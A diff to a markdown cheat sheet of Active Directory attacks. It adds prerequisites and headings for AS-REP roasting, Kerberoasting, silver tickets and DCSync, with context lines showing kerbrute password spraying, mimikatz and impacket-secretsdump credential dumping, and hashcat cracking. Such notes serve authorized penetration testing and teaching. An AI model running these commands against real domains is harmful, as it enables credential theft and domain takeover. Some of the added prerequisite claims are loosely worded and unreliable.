@@ -72,6 +72,8 @@ PS > .\kerbrute_windows_amd64.exe passwordspray -d targetorg.com .\userstohack.t
 
 ### AS-REQ Roasting
 
+Takes __Do not require Kerberos preauthentication__ to be enabled (disabled by default).
+
 #### From Linux with Impacket-GetNPUsers
 
 Impacket-GetNPUsers on GitHub: https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
@@ -114,7 +116,7 @@ Import-Module c:\path\to\powerview.ps1
 Get-DomainUser -PreauthNotRequired
 ```
 
-### Kerberoasting
+### Kerberoasting - TGS-REP on SPN
 
 #### With Impacket-GetUserSPNs
 
@@ -136,7 +138,7 @@ and crack it with `hashcat`. With `GenericWrite` or `GenericAll` permissions on 
 
 ### Silver ticket
 
-https://adsecurity.org/?p=2011
+Takes Privileged Account Certificate (PAC) not to be enabled (usual): https://adsecurity.org/?p=2011
 ```
 PS > iwr -UseDefaultCredentials http://internalwebsite # access denied
 PS > c:\path\to\mimikatz.exe
@@ -151,7 +153,16 @@ PS > iwr -UseDefaultCredentials http://internalwebsite # access granted
 
 ### Domain Controler Sync
 
-https://adsecurity.org/?p=2398#MimikatzDCSync
+Needs:
+- Replicating Directory Changes
+- Replicating Directory Changes All
+- Replicating Directory Changes in Filtered
+which are provided by:
+- Domain Admins
+- Enterprise Admins
+- Administrators (local admins `+++`)
+
+DCSync attack details: https://adsecurity.org/?p=2398#MimikatzDCSync
 Impacket-Secretsdump on GitHub: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
 
 #### From Linux
@@ -166,9 +177,10 @@ impacket-secretsdump -just-dc-user krbtgt organisation.com/someadminuser:"adminp
 
 #### From Windows
 
+From a local admin account (for example):
 ```
 PS > c:\path\to\mimikatz.exe
-mimikatz # lsadump::dcsync /user:mydomainname\username
+mimikatz # lsadump::dcsync /user:mydomainname\target_username
 $ hashcat -m 1000 ntlm_hash_from_mimikatz /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
 mimikatz # lsadump::dcsync /user:mydomainname\Administrator
